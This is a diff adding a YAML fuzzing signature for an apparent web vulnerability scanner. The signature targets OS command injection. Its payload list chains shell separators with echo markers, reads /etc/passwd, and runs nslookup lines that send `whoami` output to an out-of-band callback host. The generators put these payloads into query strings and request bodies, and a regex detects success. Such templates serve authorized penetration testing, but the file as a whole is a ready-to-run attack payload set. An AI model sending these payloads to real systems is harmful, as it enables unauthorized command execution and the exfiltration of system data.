@@ -1,0 +1,48 @@
+# info to search signature
+id: fuzz-OS-Comman_injection
+type: fuzz
+info:
+  name: OS Commaind Injection Fuzz
+  risk: High
+
+
+params:
+  - ssrf: "{{.oob}}"
+
+
+# origin: gonna come from Burp
+payloads:
+# OS Comman Injection:
+  - 'echo AGIYMZ$((282037+31337))$(echo AGIYMZ)AGIYMZ'
+  - 'echo AGIYMZ$((282037+31337))$(echo AGIYMZ)AGIYMZ'
+  - ';echo echo AGIYMZ$((282037+31337))$(echo AGIYMZ)AGIYMZ'
+  - '&echo AGIYMZ$((282037+31337))$(echo AGIYMZ)AGIYMZ'
+  - '|echo AGIYMZ$((282037+31337))$(echo AGIYMZ)AGIYMZ'
+  - '||echo AGIYMZ$((282037+31337))$(echo AGIYMZ)AGIYMZ'
+  - '&&echo AGIYMZ$((282037+31337))$(echo AGIYMZ)AGIYMZ'
+  - 'echo AGIYMZ$((282037+31337))$(echo AGIYMZ)AGIYMZ'
+  - ';echo AGIYMZ$((282037+31337))$(echo AGIYMZ)AGIYMZ'
+  - '&echo AGIYMZ$((282037+31337))$(echo AGIYMZ)AGIYMZ'
+  - '&&echo AGIYMZ$((282037+31337))$(echo AGIYMZ)AGIYMZ'
+  - '|echo AGIYMZ$((282037+31337))$(echo AGIYMZ)AGIYMZ'
+  - '||echo AGIYMZ$((282037+31337))$(echo AGIYMZ)AGIYMZ'
+  - '&&cat${IFS}/etc/passwd'
+  - '&&cat /etc/passwd'
+  - 'nslookup `whoami`.{{.Domain}}.rce.{{.ssrf}}'
+  - ' nslookup `whoami`.{{.Domain}}.rce.{{.ssrf}}'
+  - ';nslookup `whoami`.{{.Domain}}.rce.{{.ssrf}}'
+  - '&nslookup `whoami`.{{.Domain}}.rce.{{.ssrf}}'
+  - '|nslookup `whoami`.{{.Domain}}.rce.{{.ssrf}}'
+  - '||nslookup `whoami`.{{.Domain}}.rce.{{.ssrf}}'
+  - '&&nslookup `whoami`.{{.Domain}}.rce.{{.ssrf}}'
+
+   
+requests:
+  - redirect: true
+  - generators:
+      # Change exist content type or adding new one
+      - Query("{{.payload}}")
+      - Body("{{.payload}}")
+    detections:
+      - >-
+        RegexSearch("response", "root:[x*]:0:0:|AGIYMZ313374AGIYMZAGIYMZ")
